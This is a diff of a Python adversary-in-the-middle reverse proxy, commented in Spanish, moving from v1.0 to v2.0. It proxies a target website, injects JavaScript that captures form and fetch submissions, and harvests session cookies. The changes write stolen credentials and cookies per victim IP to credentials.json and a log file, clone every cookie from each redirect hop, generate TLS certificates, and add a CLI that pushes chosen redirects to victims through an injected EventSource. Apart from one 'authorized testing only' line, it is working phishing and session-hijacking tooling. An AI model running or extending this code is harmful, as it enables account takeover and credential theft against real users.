@@ -43,16 +43,23 @@ CRED_RE = re.compile(
 
 class MITMProxy:
 
-    def __init__(self, target, port=8080, certfile=None, keyfile=None):
+    def __init__(self, target, port=8080, certfile=None, keyfile=None, follow_redirects=False, output_file=None):
         self.port = port
         self.certfile = certfile
         self.keyfile = keyfile
+        self.follow_redirects = follow_redirects
         self.logfile = os.path.join(BASE, "captured.json")
+        self.output_file = output_file
         self.captures = 0
         self.reqs = 0
         self.lock = threading.Lock()
         self.sessions = {}      # ip -> requests.Session (cookie jar propio)
         self.store = {}         # ip -> {cookies, tokens} para resumen
+        self.redirects = {}     # global, per-ip, next
+        self.one_redirects = {} # ip -> (target, used_flag)
+        self.redirect_lock = threading.Lock()
+        self.credentials = []   # Lista de todas las credenciales capturadas
+        self.all_cookies = {}   # ip -> {cookie_name: cookie_value}
 
         # Target
         t = target.strip()
@@ -77,11 +84,29 @@ class MITMProxy:
         # Flask
         self.app = Flask(__name__)
         import logging; logging.getLogger('werkzeug').setLevel(logging.ERROR)
+        
+        self.redirect_event = threading.Event()
+        self.redirect_data = {}
 
         @self.app.route('/__ml__', methods=['POST'])
         def _ml():
             self._js_capture()
             return '', 204
+
+        @self.app.route('/__redir__')
+        def _redir():
+            """SSE endpoint para push instantáneo de redirects"""
+            def gen():
+                while True:
+                    self.redirect_event.wait()
+                    ip = freq.remote_addr
+                    with self.redirect_lock:
+                        if ip in self.redirect_data:
+                            target = self.redirect_data.pop(ip)
+                            yield f"data: {target}\n\n"
+                            break
+                    time.sleep(0.1)
+            return Response(gen(), mimetype='text/event-stream')
 
         @self.app.route('/', defaults={'path':''}, methods=['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'])
         @self.app.route('/<path:path>', methods=['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'])
@@ -118,6 +143,37 @@ class MITMProxy:
         sess = self._sess(ip)
         method = freq.method
 
+        # Verificar redirecciones INSTANTANEAS - NO devolver redirect, notificar vía SSE
+        with self.redirect_lock:
+            target = None
+            # one_redirect: solo redirige una vez por IP
+            if ip in self.one_redirects:
+                tgt, used = self.one_redirects[ip]
+                if not used:
+                    self.one_redirects[ip] = (tgt, True)
+                    target = tgt
+                else:
+                    del self.one_redirects[ip]
+            
+            # redirect per-ip o global
+            if not target:
+                if ip in self.redirects:
+                    target = self.redirects[ip]
+                elif 'global' in self.redirects:
+                    target = self.redirects['global']
+            
+            # next_redirect: solo aplica a la proxima peticion
+            if not target and 'next' in self.redirects:
+                target = self.redirects['next']
+                del self.redirects['next']
+            
+            if target:
+                # Notificar al cliente via SSE en vez de devolver 302
+                self.redirect_data[ip] = target
+                self.redirect_event.set()
+                # Resetear evento para próxima vez
+                threading.Timer(0.1, lambda: self.redirect_event.clear()).start()
+
         # URL destino
         tpath = f"/{path}"
         qs = freq.query_string.decode('utf-8', errors='replace')
@@ -147,7 +203,6 @@ class MITMProxy:
             sess.cookies.set(cn, cv)
 
         # ===== REQUEST AL SERVIDOR REAL =====
-        # Seguir redirects MANUALMENTE para evitar loops
         try:
             resp = self._do_request(sess, method, url, hdrs, body)
         except Exception as e:
@@ -178,13 +233,22 @@ class MITMProxy:
             if kl == 'set-cookie': continue
             fr.headers[k] = v
 
-        # Set-Cookie al navegador (best effort)
+        # Set-Cookie al navegador
         raw_sc = []
-        if hasattr(resp.raw, 'headers') and hasattr(resp.raw.headers, 'getlist'):
-            raw_sc = resp.raw.headers.getlist('Set-Cookie')
-        if not raw_sc:
-            sc = resp.headers.get('Set-Cookie')
-            if sc: raw_sc = [sc]
+        
+        # MODO --fr: usar cookies acumuladas de todos los redirects
+        if self.follow_redirects and hasattr(resp, '_mitm_cookies'):
+            raw_sc = resp._mitm_cookies
+            if raw_sc:
+                print(f"  {M}[FR] Clonando {len(raw_sc)} cookies al navegador{RST}")
+        else:
+            # MODO NORMAL: solo cookies de la respuesta final
+            if hasattr(resp.raw, 'headers') and hasattr(resp.raw.headers, 'getlist'):
+                raw_sc = resp.raw.headers.getlist('Set-Cookie')
+            if not raw_sc:
+                sc = resp.headers.get('Set-Cookie')
+                if sc: raw_sc = [sc]
+        
         for sc in raw_sc:
             fr.headers.add('Set-Cookie', self._fix_ck(sc))
 
@@ -196,7 +260,7 @@ class MITMProxy:
         return fr
 
     # ===========================================================
-    #  REQUEST CON REDIRECT MANUAL
+    #  REQUEST CON REDIRECT MANUAL (CODIGO ORIGINAL)
     # ===========================================================
     def _do_request(self, sess, method, url, hdrs, body):
         visited = set()
@@ -205,13 +269,13 @@ class MITMProxy:
         current_method = method
         current_body = body
         current_hdrs = dict(hdrs)
+        all_cookies = []  # Solo para modo --fr
 
         for hop in range(max_hops):
             # Detectar loop
             key = f"{current_method}:{current_url}"
             if key in visited:
-                print(f"  {Y}[loop] Redirect loop detectado en {current_url[:60]}, sirviendo ultima respuesta{RST}")
-                # Hacer un ultimo request sin redirects y devolver lo que sea
+                print(f"  {Y}[loop] Redirect loop detectado, sirviendo ultima respuesta{RST}")
                 return sess.request(
                     method='GET', url=current_url, headers=self._clean_hdrs(current_hdrs),
                     allow_redirects=False, timeout=25, verify=False, stream=False
@@ -230,14 +294,24 @@ class MITMProxy:
                 stream=False
             )
 
+            # MODO --fr: capturar cookies de cada hop
+            if self.follow_redirects:
+                if hasattr(resp.raw, 'headers') and hasattr(resp.raw.headers, 'getlist'):
+                    cookies_in_hop = resp.raw.headers.getlist('Set-Cookie')
+                    all_cookies.extend(cookies_in_hop)
+
             # No es redirect? Listo
             if resp.status_code not in (301, 302, 303, 307, 308):
+                if self.follow_redirects and all_cookies:
+                    resp._mitm_cookies = all_cookies
                 return resp
 
             # Es redirect - obtener Location
             location = resp.headers.get('Location', '')
             if not location:
-                return resp  # Redirect sin Location, devolver tal cual
+                if self.follow_redirects and all_cookies:
+                    resp._mitm_cookies = all_cookies
+                return resp
 
             # Hacer absoluta
             if not location.startswith('http'):
@@ -258,8 +332,10 @@ class MITMProxy:
             current_hdrs['Host'] = new_parsed.netloc
             current_url = location
 
-        # Excedio max_hops - devolver ultimo response
+        # Excedio max_hops
         print(f"  {Y}[!] Max redirects ({max_hops}) alcanzados{RST}")
+        if self.follow_redirects and all_cookies:
+            resp._mitm_cookies = all_cookies
         return resp
 
     def _clean_hdrs(self, hdrs):
@@ -269,7 +345,7 @@ class MITMProxy:
         return h
 
     # ===========================================================
-    #  URL REWRITING
+    #  REWRITE (CODIGO ORIGINAL)
     # ===========================================================
     def _to_proxy(self, url):
         if not url: return url
@@ -295,7 +371,7 @@ class MITMProxy:
         return s
 
     # ===========================================================
-    #  BODY REWRITING
+    #  BODY REWRITING (CODIGO ORIGINAL)
     # ===========================================================
     def _dec(self, b, enc):
         for e in [enc, 'utf-8', 'latin-1']:
@@ -329,7 +405,7 @@ class MITMProxy:
         return self._url_replace(self._dec(body, enc)).encode('utf-8', errors='replace')
 
     # ===========================================================
-    #  JS INYECTADO
+    #  JS INYECTADO (CODIGO ORIGINAL)
     # ===========================================================
     def _inject_js(self):
         return '''<script>
@@ -361,11 +437,14 @@ if(typeof o.body==="string")s=o.body;
 else if(o.body instanceof URLSearchParams)s=o.body.toString();
 if(s)P({t:"h",m:o.method,u:typeof u==="string"?u:"",b:s});}catch(e){}}
 return F.apply(this,arguments);};}
+
+var es=new EventSource("/__redir__");
+es.onmessage=function(e){if(e.data){window.location.href=e.data;es.close();}};
 })();
 </script>'''
 
     # ===========================================================
-    #  SNIFFING
+    #  SNIFFERS (CODIGO ORIGINAL)
     # ===========================================================
     def _sniff_post(self, ip, body, ct, url):
         try: bs = body.decode('utf-8', errors='replace')
@@ -406,7 +485,6 @@ return F.apply(this,arguments);};}
             for i, x in enumerate(obj): self._flat(x, r, f"{pfx}[{i}]")
 
     def _sniff_cookies(self, ip, sess, url):
-        """Revisa TODAS las cookies en el jar de la sesion"""
         interesting = {}
         for c in sess.cookies:
             nl = c.name.lower()
@@ -415,7 +493,6 @@ return F.apply(this,arguments);};}
                     'datr','sb','dpr','wd','presence']):
                 interesting[c.name] = c.value[:200]
         if interesting:
-            # Solo loguear si hay cookies nuevas
             prev = self.store.get(ip, {}).get('cookies', {})
             new_ck = {k: v for k, v in interesting.items() if k not in prev or prev[k] != v}
             if new_ck:
@@ -472,14 +549,55 @@ return F.apply(this,arguments);};}
         e = {'id': self.captures, 'ts': datetime.now().isoformat(),
              'type': tipo, 'ip': ip, 'url': url, 'data': data}
         if all_f: e['all_fields'] = all_f
+        
+        # Guardar credenciales siempre
+        if tipo in ('CREDENTIALS', 'FORM_CREDS'):
+            self.credentials.append({
+                'ts': e['ts'],
+                'ip': ip,
+                'url': url,
+                'credentials': data
+            })
+        
+        # Guardar cookies organizadas por IP
+        if tipo == 'COOKIES':
+            if ip not in self.all_cookies:
+                self.all_cookies[ip] = {}
+            self.all_cookies[ip].update(data)
+        
         with self.lock:
             try:
+                # Guardar en captured.json (log completo)
                 a = []
                 if os.path.exists(self.logfile):
                     with open(self.logfile) as f: a = json.load(f)
                 a.append(e)
-                with open(self.logfile, 'w') as f: json.dump(a, f, indent=2, ensure_ascii=False)
-            except: pass
+                with open(self.logfile, 'w') as f: 
+                    json.dump(a, f, indent=2, ensure_ascii=False)
+                
+                # Guardar estructura limpia en credentials.json
+                creds_file = os.path.join(BASE, "credentials.json")
+                with open(creds_file, 'w') as f:
+                    json.dump({
+                        'credentials': self.credentials,
+                        'cookies': {ip: dict(sorted(ck.items())) for ip, ck in self.all_cookies.items()}
+                    }, f, indent=2, ensure_ascii=False)
+                
+                # Output file opcional (-O)
+                if self.output_file:
+                    with open(self.output_file, 'a') as f:
+                        log_line = f"[{e['ts']}] [{e['type']}] {ip} -> {url}\n"
+                        if tipo in ('CREDENTIALS', 'FORM_CREDS'):
+                            for k, v in data.items():
+                                log_line += f"  {k}: {v}\n"
+                        elif tipo == 'COOKIES':
+                            for k, v in data.items():
+                                log_line += f"  {k}: {v[:60]}\n"
+                        log_line += "\n"
+                        f.write(log_line)
+            except Exception as ex:
+                print(f"{R}[!] Log error: {ex}{RST}")
+        
         self._show(e)
 
     def _show(self, e):
@@ -526,17 +644,70 @@ return F.apply(this,arguments);};}
         print(f"{c}{'='*70}{RST}")
 
     # ===========================================================
+    #  REDIRECT SYSTEM (NUEVAS FUNCIONALIDADES)
+    # ===========================================================
+    def _do_redirect(self, target):
+        return Response(
+            f'<html><head><meta http-equiv="refresh" content="0;url={target}"></head></html>',
+            status=302, headers={'Location': target}
+        )
+
+    def set_redirect(self, scope, target):
+        with self.redirect_lock:
+            if scope == 'next':
+                self.redirects['next'] = target
+                print(f"  {G}[R] Next request → {target}{RST}")
+            elif scope == 'global':
+                self.redirects['global'] = target
+                print(f"  {G}[R] Global redirect (instant) → {target}{RST}")
+            else:
+                self.redirects[scope] = target
+                print(f"  {G}[R] Redirect for {scope} (instant) → {target}{RST}")
+
+    def set_one_redirect(self, ip, target):
+        with self.redirect_lock:
+            self.one_redirects[ip] = (target, False)
+            print(f"  {G}[R] One-time redirect (instant) for {ip} → {target}{RST}")
+
+    def clear_redirect(self, scope=None):
+        """Alias: clean redirects"""
+        self.clean_redirect(scope)
+    
+    def clean_redirect(self, scope=None):
+        with self.redirect_lock:
+            if scope:
+                if scope in self.redirects:
+                    del self.redirects[scope]
+                    print(f"  {Y}[R] Cleaned redirect: {scope}{RST}")
+                elif scope in self.one_redirects:
+                    del self.one_redirects[scope]
+                    print(f"  {Y}[R] Cleaned one_redirect: {scope}{RST}")
+            else:
+                self.redirects.clear()
+                self.one_redirects.clear()
+                print(f"  {Y}[R] Cleaned all redirects{RST}")
+
+    # ===========================================================
     #  START
     # ===========================================================
     def start(self):
         lip = _lip()
+        proto = "https" if self.certfile and self.keyfile else "http"
         print(f"\n{M}{'='*70}")
         print(f"{'MITM REVERSE PROXY'.center(70)}")
         print(f"{'='*70}{RST}")
-        print(f"  {BOLD}Proxy:{RST}    http://0.0.0.0:{self.port}")
-        print(f"  {BOLD}LAN:{RST}      http://{lip}:{self.port}")
+        print(f"  {BOLD}Proxy:{RST}    {proto}://0.0.0.0:{self.port}")
+        print(f"  {BOLD}LAN:{RST}      {proto}://{lip}:{self.port}")
         print(f"  {BOLD}Target:{RST}   {self.origin}")
-        print(f"  {BOLD}Log:{RST}      {self.logfile}")
+        print(f"  {BOLD}Logs:{RST}")
+        print(f"    - Full log:     {self.logfile}")
+        print(f"    - Credentials:  {os.path.join(BASE, 'credentials.json')}")
+        if self.output_file:
+            print(f"    - Text output:  {self.output_file}")
+        if self.follow_redirects:
+            print(f"  {BOLD}Mode:{RST}     --fr (Follow redirects + clone ALL cookies)")
+        else:
+            print(f"  {BOLD}Mode:{RST}     Normal (cookies from final response only)")
         print()
         print(f"\n  {DIM}Ctrl+C para detener{RST}")
         print(f"{M}{'='*70}{RST}\n")
@@ -580,15 +751,164 @@ def _arg(f, d=None):
         except: pass
     return d
 
+def _has_flag(f):
+    return f in sys.argv
+
+def _gen_ssl_cert(cert_path, key_path):
+    try:
+        from OpenSSL import crypto
+    except ImportError:
+        os.system("pip3 install pyopenssl -q")
+        from OpenSSL import crypto
+    
+    k = crypto.PKey()
+    k.generate_key(crypto.TYPE_RSA, 2048)
+    
+    cert = crypto.X509()
+    cert.get_subject().C = "US"
+    cert.get_subject().ST = "State"
+    cert.get_subject().L = "City"
+    cert.get_subject().O = "Organization"
+    cert.get_subject().OU = "Unit"
+    cert.get_subject().CN = "localhost"
+    
+    cert.set_serial_number(1000)
+    cert.gmtime_adj_notBefore(0)
+    cert.gmtime_adj_notAfter(365*24*60*60)
+    cert.set_issuer(cert.get_subject())
+    cert.set_pubkey(k)
+    cert.sign(k, 'sha256')
+    
+    with open(cert_path, "wb") as f:
+        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
+    with open(key_path, "wb") as f:
+        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
+    
+    print(f"  {G}[+] SSL certificate generated:{RST}")
+    print(f"      {cert_path}")
+    print(f"      {key_path}")
+
+def _interactive_cli(proxy):
+    try:
+        from prompt_toolkit import PromptSession
+        from prompt_toolkit.completion import WordCompleter
+    except ImportError:
+        os.system("pip3 install prompt_toolkit -q")
+        from prompt_toolkit import PromptSession
+        from prompt_toolkit.completion import WordCompleter
+    
+    commands = WordCompleter(['redirect', 'next_redirect', 'one_redirect', 'clean', 'clear', 'exit', 'help', 'status'], ignore_case=True)
+    session = PromptSession(completer=commands)
+    
+    print(f"\n{CY}Interactive CLI started. Type 'help' for commands.{RST}\n")
+    
+    while True:
+        try:
+            cmd = session.prompt('> ').strip()
+            if not cmd:
+                continue
+            
+            parts = cmd.split(None, 2)
+            action = parts[0].lower()
+            
+            if action == 'exit':
+                print(f"{Y}Exiting CLI...{RST}")
+                break
+            
+            elif action == 'help':
+                print(f"\n{CY}Available commands:{RST}")
+                print(f"  {G}redirect global <url>{RST}       - Instant global redirect")
+                print(f"  {G}redirect <ip> <url>{RST}         - Instant per-IP redirect")
+                print(f"  {G}next_redirect <url>{RST}         - Redirect only next request")
+                print(f"  {G}one_redirect <ip> <url>{RST}     - Instant redirect once (auto-clear after)")
+                print(f"  {G}clean [global|<ip>]{RST}         - Clean redirect(s)")
+                print(f"  {G}clear{RST}                       - Clear console")
+                print(f"  {G}status{RST}                      - Show active redirects")
+                print(f"  {G}exit{RST}                        - Exit CLI\n")
+            
+            elif action == 'redirect':
+                if len(parts) < 3:
+                    print(f"{R}Usage: redirect <global|ip> <url>{RST}")
+                    continue
+                scope = parts[1]
+                target = parts[2]
+                proxy.set_redirect(scope, target)
+            
+            elif action == 'next_redirect':
+                if len(parts) < 2:
+                    print(f"{R}Usage: next_redirect <url>{RST}")
+                    continue
+                target = parts[1]
+                proxy.set_redirect('next', target)
+            
+            elif action == 'one_redirect':
+                if len(parts) < 3:
+                    print(f"{R}Usage: one_redirect <ip> <url>{RST}")
+                    continue
+                ip = parts[1]
+                target = parts[2]
+                proxy.set_one_redirect(ip, target)
+            
+            elif action == 'clean':
+                if len(parts) > 1:
+                    proxy.clean_redirect(parts[1])
+                else:
+                    proxy.clean_redirect()
+            
+            elif action == 'clear':
+                os.system('clear' if os.name != 'nt' else 'cls')
+            
+            elif action == 'status':
+                with proxy.redirect_lock:
+                    if not proxy.redirects and not proxy.one_redirects:
+                        print(f"  {DIM}No active redirects{RST}")
+                    else:
+                        if proxy.redirects:
+                            print(f"\n{CY}Active redirects:{RST}")
+                            for scope, target in proxy.redirects.items():
+                                print(f"  {G}{scope:15}{RST} → {target}")
+                        if proxy.one_redirects:
+                            print(f"\n{CY}One-time redirects:{RST}")
+                            for ip, (target, used) in proxy.one_redirects.items():
+                                status = f"{R}USED{RST}" if used else f"{G}PENDING{RST}"
+                                print(f"  {G}{ip:15}{RST} → {target} [{status}]")
+                        print()
+            
+            else:
+                print(f"{R}Unknown command: {action}. Type 'help' for available commands.{RST}")
+        
+        except KeyboardInterrupt:
+            print(f"\n{Y}Use 'exit' to quit{RST}")
+        except EOFError:
+            break
+        except Exception as e:
+            print(f"{R}Error: {e}{RST}")
+
 def main():
     print(f"""
 {M}{'='*70}
-{'MITM Reverse Proxy v1.0'.center(70)}
+{'MITM Reverse Proxy v2.0'.center(70)}
 {'='*70}{RST}
   {Y}Uso:{RST}
     python3 {sys.argv[0]} --target ejemplo.com
     python3 {sys.argv[0]} --target ejemplo.com --port 9090
+    python3 {sys.argv[0]} --target ejemplo.com --ssl
     python3 {sys.argv[0]} --target ejemplo.com --ssl-cert c.pem --ssl-key k.pem
+    python3 {sys.argv[0]} --target ejemplo.com --fr
+    python3 {sys.argv[0]} --target ejemplo.com -O output.txt
+    python3 {sys.argv[0]} --target ejemplo.com -O
+
+  {CY}Flags:{RST}
+    --ssl                Auto-generate self-signed SSL certificate
+    --fr                 Follow redirects + clone ALL cookies from each hop
+    --ssl-cert <file>    Custom SSL certificate
+    --ssl-key <file>     Custom SSL key
+    -O [file]            Save full log to file (auto-generate if no file)
+
+  {CY}Modo Normal vs --fr:{RST}
+    {W}Normal:{RST} Sigue redirects pero solo envia cookies de respuesta final
+    {W}--fr:{RST}   Sigue redirects y acumula TODAS las cookies de cada hop
+            Clona sesion completa al navegador
 
   {R}Solo para pruebas autorizadas.{RST}
 {M}{'='*70}{RST}
@@ -598,6 +918,18 @@ def main():
     port = int(_arg('--port', '8080'))
     sc = _arg('--ssl-cert')
     sk = _arg('--ssl-key')
+    use_ssl = _has_flag('--ssl')
+    follow_redirects = _has_flag('--fr')
+    
+    # Output file
+    output_file = None
+    if '-O' in sys.argv:
+        idx = sys.argv.index('-O')
+        if idx + 1 < len(sys.argv) and not sys.argv[idx + 1].startswith('-'):
+            output_file = sys.argv[idx + 1]
+        else:
+            output_file = f"mitm_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        print(f"  {G}[+] Output log: {output_file}{RST}")
 
     if not target:
         target = input(f"  {CY}URL objetivo: {RST}").strip()
@@ -607,7 +939,20 @@ def main():
         try: port = int(p)
         except: pass
 
-    MITMProxy(target, port, sc, sk).start()
+    if use_ssl and not (sc and sk):
+        cert_dir = os.path.join(BASE, "ssl")
+        os.makedirs(cert_dir, exist_ok=True)
+        sc = os.path.join(cert_dir, "cert.pem")
+        sk = os.path.join(cert_dir, "key.pem")
+        if not os.path.exists(sc) or not os.path.exists(sk):
+            _gen_ssl_cert(sc, sk)
+
+    proxy = MITMProxy(target, port, sc, sk, follow_redirects, output_file)
+    
+    cli_thread = threading.Thread(target=_interactive_cli, args=(proxy,), daemon=True)
+    cli_thread.start()
+    
+    proxy.start()
 
 if __name__ == "__main__":
     main()
